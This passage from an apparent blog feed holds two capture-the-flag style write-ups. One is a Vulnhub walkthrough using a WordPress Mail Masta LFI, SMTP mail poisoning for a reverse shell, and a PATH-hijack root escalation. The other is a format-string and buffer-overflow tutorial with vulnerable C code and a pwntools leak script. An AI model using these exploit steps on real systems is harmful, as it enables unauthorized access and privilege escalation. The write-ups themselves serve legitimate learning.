Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.</p></blockquote><hr><p>Not relevant.</p><hr><p>todo.txt</p><blockquote><ol><li>Binge watch Dexter</li><li>Dance</li><li>Work on /h3l105</li></ol></blockquote><hr><p>There <code>/h3l105</code> is our focus.</p><h1 id="WordPress-Enumeration"><a href="#WordPress-Enumeration" class="headerlink" title="WordPress Enumeration"></a>WordPress Enumeration</h1><p>So, accesing to <code>http://192.168.43.12/h3l105</code> reveals a wordpress website with login, post, castegories and other link.</p><hr><p>Note</p><blockquote><p>When you try to acces <code>/wp-login.php</code>, you’ll recieve a error so to resolve that add machine IP Address to your <code>/etc/hosts</code> file as <code>symfonos.local</code>.</p></blockquote><hr><p>Well, it’s wordpress so <code>wpscan</code> to rescuse.<br>Using <code>wpscan --url http://symfonos.local/h3l105 --no-banner --no-update</code> reveals two CVEs, one is SQL Injection and other LFI vulnerability both in Mail Masta Plugin 1.0.</p><p><img src="/img/symfonos/symfonoswpscan.png" alt></p><h1 id="Exploiting-LFI-Vulnerabilty"><a href="#Exploiting-LFI-Vulnerabilty" class="headerlink" title="Exploiting LFI Vulnerabilty"></a>Exploiting LFI Vulnerabilty</h1><p><a href="https://www.exploit-db.com/exploits/40290" target="_blank" rel="noopener">Here</a>, shows LFI PoC. So implementing the PoC on <code>http://symfonos.local/h3l105</code>,</p><p>Visiting <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</code> reveals the content of <code>/etc/passwd</code>.</p><p><img src="/img/symfonos/symfonosetc.png" alt></p><p>We can also access <code>/wp-config.php</code>(this was not relevant) as well as some other files including <code>/var/mail/helios</code>.</p><p>I was completely clueless so I asked <a href="https://twitter.com/DCAU7" target="_blank" rel="noopener">@DCAU7</a> for hint, he told me that I need to use SMTP to progress from here.</p><h1 id="SMTP-Enumeration-and-Reverse-Shell-via-SMTP"><a href="#SMTP-Enumeration-and-Reverse-Shell-via-SMTP" class="headerlink" title="SMTP Enumeration and Reverse Shell via SMTP"></a>SMTP Enumeration and Reverse Shell via SMTP</h1><p>Using telnet we can connect to SMTP and we can send data to <code>/var/mail/helios</code> since it’s accessible through LFI vulnerability.</p><blockquote><p>telnet symfonos.local 25</p></blockquote><p>Once connected we can use it to execute our php code by accessing to <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios</code>.</p><p><img src="/img/symfonos/symfonosvarmail.png" alt></p><p>First let’s send a email to helios with our reverse shell</p><p>Using telnet we can connect to SMTP and from there we can send our reverse shell.</p><blockquote><p>telnet symfonos.local 25</p></blockquote><pre><code>MAIL FROM: RobinRCPT TO: heliosDATA&lt;PHP Reverse Shell&gt;.quit</code></pre><p><img src="/img/symfonos/symfonossmtp.png" alt></p><h1 id="Getting-User-and-Root"><a href="#Getting-User-and-Root" class="headerlink" title="Getting User and Root"></a>Getting User and Root</h1><p>So, once email will be sent we can route to <code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios</code> and that will execute our reverse shell.</p><p><img src="/img/symfonos/symfonosshell.png" alt></p><blockquote><p>find / -perm -u=s -type f 2&gt;/dev/null</p></blockquote><p><img src="/img/symfonos/symfonosfind.png" alt></p><p>Reveals a interesting file <code>/opt/statuscheck</code>, so analyzing that binary reveals that it is scraping the document info of that website. Using<br><code>strings statuscheck</code> reveals that it’s using curl i.e. <code>curl -I http://localhost.com</code> which basically gives the head information of a website. I tried to search for curl privilege escalation but sadly it wasn’t useful.<br>I was stuck at this but <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a> gave me a hint that it’s something that we have done before.</p><p><img src="/img/symfonos/symfonosstrings.png" alt></p><p>So, that helped me a lot. I chnaged directory to <code>/tmp</code> folder and ceated a binary named curl by using following commands:-</p><pre><code>$ echo $&quot;#!/bin/sh\n/bin/sh&quot; &gt; curl$ chmod 777 curl$ export PATH=:$(pwd)$ /opt/statuscheck</code></pre><p><img src="/img/symfonos/symfonosroot.png" alt></p><p>That was it folks.</p><h1 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h1><p>So, <a href="https://twittwer.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a> gained that reverse shell in a different way than mine. So, there are two ways to gain reverse shell to the symfonos machine.<br>Here’s his <a href="https://mzfr.github.io/symfonos" target="_blank" rel="noopener">writeup</a>.</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Binary Exploitation - Format String + Buffer Overflow Vulnerability</title>
      <link href="/2018/09/13/fmt-bof/"/>
      <url>/2018/09/13/fmt-bof/</url>
      
        <content type="html"><![CDATA[<p>A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.</p><h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.</p><blockquote><p>Warning: This post will be long and detailed enough, so hang in there.</p></blockquote><h1 id="What-is-Format-String-Vulnerability"><a href="#What-is-Format-String-Vulnerability" class="headerlink" title="What is Format String Vulnerability?"></a>What is Format String Vulnerability?</h1><p>At first, let’s start as we normally would. Format string as in C used to specify the the way data is going to be printed to the screen or console. Consider the following program:-</p><pre class=" language-C"><code class="language-C">#include<stdio.h>int main(int argc, char *argv[]){     printf(argv[1]); /* No format specifier - here's the vulnerability */     printf("\n");     return 0;}</code></pre><p>Let’s compile this:-</p><pre class=" language-bash"><code class="language-bash">robin@oracle:/tmp$ gcc -o new new.cnew.c: In <span class="token keyword">function</span> ‘main’:new.c:3:6: warning: implicit declaration of <span class="token keyword">function</span> ‘printf’ <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>      printf<span class="token punctuation">(</span>argv<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> /* No <span class="token function">format</span> specifier */      ^~~~~~new.c:3:6: warning: incompatible implicit declaration of built-in <span class="token keyword">function</span> ‘printf’new.c:3:6: note: include ‘<span class="token operator">&lt;</span>stdio.h<span class="token operator">></span>’ or provide a declaration of ‘printf’new.c:3:6: warning: <span class="token function">format</span> not a string literal and no <span class="token function">format</span> arguments <span class="token punctuation">[</span>-Wformat-security<span class="token punctuation">]</span>  <span class="token operator">&lt;</span>--- Warning <span class="token keyword">for</span> no <span class="token function">format</span> specification </code></pre><p>Ah, so we got a warning(intended one), let’s run:-</p><pre class=" language-bash"><code class="language-bash">robin@oracle:/tmp$ ./new HelloHello  <span class="token operator">&lt;</span>-- Works fine<span class="token operator">!</span>  robin@oracle:/tmp$ ./new %xd24f0e8 <span class="token operator">&lt;</span>-- Wait, what?</code></pre><p>As you can see it works fine if we give it a string or something else but as soon as we give it a hex format specifier it gives hex data. In case you’re wondering, that hex data is an actual address from the program stack. Thus, if there’s no format specifier in a program and the data is being printed or shown accordingly, we can use a format specifier as an input parameter to leak stack addresses for own use.</p><h1 id="What-is-Buffer-Overflow"><a href="#What-is-Buffer-Overflow" class="headerlink" title="What is Buffer Overflow?"></a>What is Buffer Overflow?</h1><p>I’m sure that most of you know what it is but still let’s have a recap. Buffer overflow vulnerability occurs when a user gives more input than it was supposed to handle hence making the memory region to overflow by the input. If used smartly, it can be used for many gains.</p><p>Consider the following program:-</p><pre class=" language-C"><code class="language-C">#include<stdio.h>#include<stdlib.h>void winner(){ system("/bin/bash");} int main(){ char buf[10]; scanf("%s",buf); printf("Hello %s",buf); return 0;}</code></pre><p>PS: It was the only simple thing I could think of.</p><p>So, as you can see it takes 10 characters as input and display them. Let’s compile it and turn off the protections to make it work:</p><pre class=" language-bash"><code class="language-bash">robin@oracle:/tmp$ <span class="token function">sudo</span> <span class="token function">bash</span> -c <span class="token string">'echo 0 > /proc/sys/kernel/randomize_va_space'</span> <span class="token comment" spellcheck="true"># Turn off the ASLR(Address Space Layout Randomization)</span>robin@oracle:/tmp$ gcc -o bof -fno-stack-protector -z execstack bof.c  <span class="token comment" spellcheck="true"># Makes Stack Executable and turn off stack smashing</span></code></pre><p>It’s compiled now, time to run it:-</p><pre class=" language-bash"><code class="language-bash">robin@oracle:/tmp$ ./bofAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASegmentation fault <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span></code></pre><p>A Segementation Fault, we have a buffer overflow vulnerability here.</p><blockquote><p>Note: The Buffer Overflow program, consider it as a challenge and complete it. Go Pwn! </p></blockquote><h1 id="Protections-on-Binaries"><a href="#Protections-on-Binaries" class="headerlink" title="Protections on Binaries"></a>Protections on Binaries</h1><p>As you saw earlier, I used some gcc flags to turn off the standard protections. This process is commonly referred to as hardening as these protections prevents the vulnerability to be exploited and hence makes it harder for us to exploit it. These protections includes:-</p><ul><li>Buffer overflow protection</li><li>Stack overwriting protection</li><li>Position independent executables (see Address space layout randomization)</li><li>Binary stirring (randomizing the address of basic blocks)</li><li>Pointer masking (protection against code injection)</li><li>Control flow randomization (to protect against control flow diversion)</li></ul><p>Following are the protections, we will deal with:- </p><h4 id="Stack-Canaries"><a href="#Stack-Canaries" class="headerlink" title="Stack Canaries"></a>Stack Canaries</h4><p>This method works by placing a small integer, the value of which is randomly chosen at program start, in memory just before the stack return pointer. Most buffer overflows overwrite memory from lower to higher memory addresses, so in order to overwrite the return pointer (and thus take control of the process) the canary value must also be <strong>overwritten</strong>. This value is checked to make sure it has not changed before a routine uses the return pointer on the stack.</p><h4 id="Non-Executable-Stack"><a href="#Non-Executable-Stack" class="headerlink" title="Non-Executable Stack"></a>Non-Executable Stack</h4><p>Another approach to preventing stack buffer overflow exploitation is to enforce a memory policy on the stack memory region that disallows execution from the stack. This means that in order to execute shellcode from the stack an attacker must either find a way to disable the execution protection from memory, or find a way to put her/his shellcode payload in a non-protected region of memory.<br>Even if this were not so, there are other ways. The most damning is the so-called return to libc method for shellcode creation. In this attack the malicious payload will load the stack not with shellcode, but with a proper call stack so that execution is vectored to a chain of standard library calls, usually with the effect of disabling memory execute protections and allowing shellcode to run as normal. This works because the execution never actually vectors to the stack itself.<br>A variant of return-to-libc is return-oriented programming (ROP), which sets up a series of return addresses, each of which executes a small sequence of cherry-picked machine instructions within the existing program code or system libraries, sequence which ends with a return. These so-called gadgets each accomplish some simple register manipulation or similar execution before returning, and stringing them together achieves the attacker’s ends. It is even possible to use “returnless” return-oriented programming by exploiting instructions or groups of instructions that behave much like a return instruction.</p><blockquote><p>This is an ongoing series on my blog.</p></blockquote><h1 id="main"><a href="#main" class="headerlink" title="main"></a><strong>main</strong></h1><p>Now, let’s get started:-</p><h5 id="Attached-files"><a href="#Attached-files" class="headerlink" title="Attached files:"></a>Attached files:</h5><p><a href="/files/binary/q3">q3</a></p><h3 id="Analysing-the-binary"><a href="#Analysing-the-binary" class="headerlink" title="Analysing the binary"></a>Analysing the binary</h3><p>Let’s analyse or reverse enginner the binary first, I’ll be using radare2 for disassembly and IDA Pro for decompiled functions:-</p><pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">$</span> r2 <span class="token operator">-</span>AAAA q3<span class="token operator">-</span><span class="token operator">-</span>snip<span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">0x00000670</span><span class="token punctuation">]</span><span class="token operator">></span> afl<span class="token number">0x00000000</span>    <span class="token number">3</span> <span class="token number">72</span>   <span class="token operator">-></span> <span class="token number">73</span>   sym.imp.__libc_start_main<span class="token number">0x000005f8</span>    <span class="token number">3</span> <span class="token number">23</span>           sym._init<span class="token number">0x00000620</span>    <span class="token number">1</span> <span class="token number">6</span>            sym.imp.puts<span class="token number">0x00000630</span>    <span class="token number">1</span> <span class="token number">6</span>            sym.imp.__stack_chk_fail<span class="token number">0x00000640</span>    <span class="token number">1</span> <span class="token number">6</span>            sym.imp.printf<span class="token number">0x00000650</span>    <span class="token number">1</span> <span class="token number">6</span>            sym.imp.fgets<span class="token number">0x00000660</span>    <span class="token number">1</span> <span class="token number">6</span>            sub.__cxa_finalize_248_660<span class="token number">0x00000670</span>    <span class="token number">1</span> <span class="token number">43</span>           entry0<span class="token number">0x000006a0</span>    <span class="token number">4</span> <span class="token number">50</span>   <span class="token operator">-></span> <span class="token number">40</span>   sym.deregister_tm_clones<span class="token number">0x000006e0</span>    <span class="token number">4</span> <span class="token number">66</span>   <span class="token operator">-></span> <span class="token number">57</span>   sym.register_tm_clones<span class="token number">0x00000730</span>    <span class="token number">4</span> <span class="token number">49</span>           sym.__do_global_dtors_aux<span class="token number">0x00000770</span>    <span class="token number">1</span> <span class="token number">10</span>           entry1.init<span class="token number">0x0000077a</span>    <span class="token number">3</span> <span class="token number">182</span>          sym.main<span class="token number">0x00000830</span>    <span class="token number">4</span> <span class="token number">101</span>          sym.__libc_csu_init<span class="token number">0x000008a0</span>    <span class="token number">1</span> <span class="token number">2</span>            sym.__libc_csu_fini<span class="token number">0x000008a4</span>    <span class="token number">1</span> <span class="token number">9</span>            sym._fini</code></pre><p>No special function is seen here, let’s disassemble <code>main</code>:-</p><pre class=" language-r"><code class="language-r"><span class="token punctuation">[</span><span class="token number">0x00000670</span><span class="token punctuation">]</span><span class="token operator">></span> pdf <span class="token operator">@</span>main            <span class="token punctuation">;</span><span class="token operator">-</span><span class="token operator">-</span> main<span class="token operator">:</span><span class="token operator">/</span> <span class="token punctuation">(</span>fcn<span class="token punctuation">)</span> sym.main <span class="token number">182</span><span class="token operator">|</span>   sym.main <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">|</span>           <span class="token punctuation">;</span> var FILE local_28h <span class="token operator">@</span> rbp<span class="token operator">-</span><span class="token number">0x28</span><span class="token operator">|</span>           <span class="token punctuation">;</span> var int local_20h <span class="token operator">@</span> rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">|</span>           <span class="token punctuation">;</span> var int local_18h <span class="token operator">@</span> rbp<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">|</span>           <span class="token punctuation">;</span> var int local_8h <span class="token operator">@</span> rbp<span class="token operator">-</span><span class="token number">0x8</span><span class="token operator">|</span>              <span class="token punctuation">;</span> DATA XREF from <span class="token number">0x0000068d</span> <span class="token punctuation">(</span>entry0<span class="token punctuation">)</span><span class="token operator">|</span>           <span class="token number">0x0000077a</span>      <span class="token number">55</span>             push rbp<span class="token operator">|</span>           <span class="token number">0x0000077b</span>      <span class="token number">4889e5</span>         mov rbp<span class="token punctuation">,</span> rsp<span class="token operator">|</span>           <span class="token number">0x0000077e</span>      4883ec30       sub rsp<span class="token punctuation">,</span> <span class="token number">0x30</span>               <span class="token punctuation">;</span> <span class="token string">'0'</span><span class="token operator">|</span>           <span class="token number">0x00000782</span>      64488b042528.  mov rax<span class="token punctuation">,</span> qword fs<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">]</span>    <span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token number">0x28</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x19e0</span> <span class="token punctuation">;</span> <span class="token string">'('</span><span class="token operator">|</span>           <span class="token number">0x0000078b</span>      488945f8       mov qword <span class="token punctuation">[</span>local_8h<span class="token punctuation">]</span><span class="token punctuation">,</span> rax<span class="token operator">|</span>           <span class="token number">0x0000078f</span>      31c0           xor eax<span class="token punctuation">,</span> eax<span class="token operator">|</span>           <span class="token number">0x00000791</span>      48c745e00000.  mov qword <span class="token punctuation">[</span>local_20h<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">|</span>           <span class="token number">0x00000799</span>      48c745e80000.  mov qword <span class="token punctuation">[</span>local_18h<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">|</span>           <span class="token number">0x000007a1</span>      488b05680820.  mov rax<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>obj.stdin<span class="token punctuation">]</span>  <span class="token punctuation">;</span> loc.stdin <span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token number">0x201010</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">|</span>           <span class="token number">0x000007a8</span>      488945d8       mov qword <span class="token punctuation">[</span>local_28h<span class="token punctuation">]</span><span class="token punctuation">,</span> rax<span class="token operator">|</span>           <span class="token number">0x000007ac</span>      488d3d010100.  lea rdi<span class="token punctuation">,</span> qword str.Enter_name_<span class="token operator">:</span> <span class="token punctuation">;</span> <span class="token number">0x8b4</span> <span class="token punctuation">;</span> <span class="token string">"Enter name : "</span> <span class="token punctuation">;</span> const char <span class="token operator">*</span> format<span class="token operator">|</span>           <span class="token number">0x000007b3</span>      b800000000     mov eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">|</span>           <span class="token number">0x000007b8</span>      e883feffff     call sym.imp.printf         <span class="token punctuation">;</span> int printf<span class="token punctuation">(</span>const char <span class="token operator">*</span>format<span class="token punctuation">)</span><span class="token operator">|</span>           <span class="token number">0x000007bd</span>      488b55d8       mov rdx<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_28h<span class="token punctuation">]</span>  <span class="token punctuation">;</span> FILE <span class="token operator">*</span>stream<span class="token operator">|</span>           <span class="token number">0x000007c1</span>      488d45e0       lea rax<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_20h<span class="token punctuation">]</span><span class="token operator">|</span>           <span class="token number">0x000007c5</span>      be10000000     mov esi<span class="token punctuation">,</span> <span class="token number">0x10</span>               <span class="token punctuation">;</span> int size<span class="token operator">|</span>           <span class="token number">0x000007ca</span>      4889c7         mov rdi<span class="token punctuation">,</span> rax                <span class="token punctuation">;</span> char <span class="token operator">*</span>s<span class="token operator">|</span>           <span class="token number">0x000007cd</span>      e87efeffff     call sym.imp.fgets          <span class="token punctuation">;</span> char <span class="token operator">*</span>fgets<span class="token punctuation">(</span>char <span class="token operator">*</span>s<span class="token punctuation">,</span> int size<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token operator">|</span>           <span class="token number">0x000007d2</span>      488d3de90000.  lea rdi<span class="token punctuation">,</span> qword str.Hello    <span class="token punctuation">;</span> <span class="token number">0x8c2</span> <span class="token punctuation">;</span> <span class="token string">"Hello"</span> <span class="token punctuation">;</span> const char <span class="token operator">*</span> s<span class="token operator">|</span>           <span class="token number">0x000007d9</span>      e842feffff     call sym.imp.puts           <span class="token punctuation">;</span> int puts<span class="token punctuation">(</span>const char <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token operator">|</span>           <span class="token number">0x000007de</span>      488d45e0       lea rax<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_20h<span class="token punctuation">]</span><span class="token operator">|</span>           <span class="token number">0x000007e2</span>      4889c7         mov rdi<span class="token punctuation">,</span> rax                <span class="token punctuation">;</span> const char <span class="token operator">*</span> format<span class="token operator">|</span>           <span class="token number">0x000007e5</span>      b800000000     mov eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">|</span>           <span class="token number">0x000007ea</span>      e851feffff     call sym.imp.printf         <span class="token punctuation">;</span> int printf<span class="token punctuation">(</span>const char <span class="token operator">*</span>format<span class="token punctuation">)</span><span class="token operator">|</span>           <span class="token number">0x000007ef</span>      488d3dd20000.  lea rdi<span class="token punctuation">,</span> qword str.Enter_sentence_<span class="token operator">:</span> <span class="token punctuation">;</span> <span class="token number">0x8c8</span> <span class="token punctuation">;</span> <span class="token string">"Enter sentence : "</span> <span class="token punctuation">;</span> const char <span class="token operator">*</span> format<span class="token operator">|</span>           <span class="token number">0x000007f6</span>      b800000000     mov eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">|</span>           <span class="token number">0x000007fb</span>      e840feffff     call sym.imp.printf         <span class="token punctuation">;</span> int printf<span class="token punctuation">(</span>const char <span class="token operator">*</span>format<span class="token punctuation">)</span><span class="token operator">|</span>           <span class="token number">0x00000800</span>      488b55d8       mov rdx<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_28h<span class="token punctuation">]</span>  <span class="token punctuation">;</span> FILE <span class="token operator">*</span>stream<span class="token operator">|</span>           <span class="token number">0x00000804</span>      488d45e0       lea rax<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_20h<span class="token punctuation">]</span><span class="token operator">|</span>           <span class="token number">0x00000808</span>      be00010000     mov esi<span class="token punctuation">,</span> <span class="token number">0x100</span>              <span class="token punctuation">;</span> int size<span class="token operator">|</span>           <span class="token number">0x0000080d</span>      4889c7         mov rdi<span class="token punctuation">,</span> rax                <span class="token punctuation">;</span> char <span class="token operator">*</span>s<span class="token operator">|</span>           <span class="token number">0x00000810</span>      e83bfeffff     call sym.imp.fgets          <span class="token punctuation">;</span> char <span class="token operator">*</span>fgets<span class="token punctuation">(</span>char <span class="token operator">*</span>s<span class="token punctuation">,</span> int size<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token operator">|</span>           <span class="token number">0x00000815</span>      b800000000     mov eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">|</span>           <span class="token number">0x0000081a</span>      488b4df8       mov rcx<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_8h<span class="token punctuation">]</span><span class="token operator">|</span>           <span class="token number">0x0000081e</span>      6448330c2528.  xor rcx<span class="token punctuation">,</span> qword fs<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">]</span><span class="token operator">|</span>       <span class="token punctuation">,</span><span class="token operator">=</span><span class="token operator">&lt;</span> <span class="token number">0x00000827</span>      <span class="token number">7405</span>           je <span class="token number">0x82e</span><span class="token operator">|</span>       <span class="token operator">|</span>   <span class="token number">0x00000829</span>      e802feffff     call sym.imp.__stack_chk_fail <span class="token punctuation">;</span> void __stack_chk_fail<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token operator">|</span>       <span class="token operator">|</span>      <span class="token punctuation">;</span> JMP XREF from <span class="token number">0x00000827</span> <span class="token punctuation">(</span>sym.main<span class="token punctuation">)</span><span class="token operator">|</span>       `<span class="token operator">-></span> <span class="token number">0x0000082e</span>      c9             leave\           <span class="token number">0x0000082f</span>      c3             ret</code></pre><p>First input is getting printed and as you can see at line <code>0x000007d2      488d3de90000.  lea rdi, qword str.Hello    ; 0x8c2 ; &quot;Hello&quot; ; const char * s</code> there’s no specifier at the commented string otherwise radare2 would’ve been able to show it. And since it’s getting printed with <code>0x000007ea      e851feffff     call sym.imp.printf         ; int printf(const char *format)</code> instruction we know where the format string vulerability is.</p><p>For ease of understanding, we have a decompiled function with the help of IDA:-</p><pre class=" language-C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp){  FILE *stream; // ST08_8  char s[8]; // [rsp+10h] [rbp-20h]  __int64 v6; // [rsp+18h] [rbp-18h]  unsigned __int64 v7; // [rsp+28h] [rbp-8h]  v7 = __readfsqword(0x28u);  *(_QWORD *)s = 0LL;  v6 = 0LL;  stream = (FILE *)_bss_start;  printf("Enter name : ", argv, envp);  fgets(s, 16, stream);  puts("Hello");  printf(s, 16LL);  <-- Here's the vulnerability, just like in that example, isn't it?  printf("Enter sentence : ");  fgets(s, 256, stream);  return 0;}</code></pre><h3 id="Exploiting-the-binary"><a href="#Exploiting-the-binary" class="headerlink" title="Exploiting the binary"></a>Exploiting the binary</h3><p>So, let’s make a script to find the offset for the input on stack, who knows we might be able to get something of interest?</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./q3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA %{}$lx"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># will print the stack data in hex format</span>    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Hello</span>    <span class="token keyword">print</span> i<span class="token punctuation">,</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Let’s run it:-</p><pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">$</span> python find_off.py <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8323</span><span class="token number">2</span> AAAA 7ffff7dd18c0<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8323</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8325</span><span class="token number">3</span> AAAA 7ffff7af4154<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8325</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8327</span><span class="token number">4</span> AAAA 7ffff7fd24c0<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8327</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8329</span><span class="token number">5</span> AAAA <span class="token number">0</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8329</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8331</span><span class="token number">6</span> AAAA 7ffff7de59a0<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8331</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8333</span><span class="token number">7</span> AAAA 7ffff7dcfa00<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8333</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8335</span><span class="token number">8</span> AAAA <span class="token number">2438252041414141</span>                                        <span class="token operator">&lt;-</span><span class="token operator">-</span><span class="token operator">-</span> Offset <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8335</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8337</span><span class="token number">9</span> AAAA a786c<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8337</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8339</span><span class="token number">10</span> AAAA 7fffffffde80<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8339</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8341</span><span class="token number">11</span> AAAA a17e6a7c1c53c000                                       <span class="token operator">&lt;-</span><span class="token operator">-</span><span class="token operator">-</span> This is of interest<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token 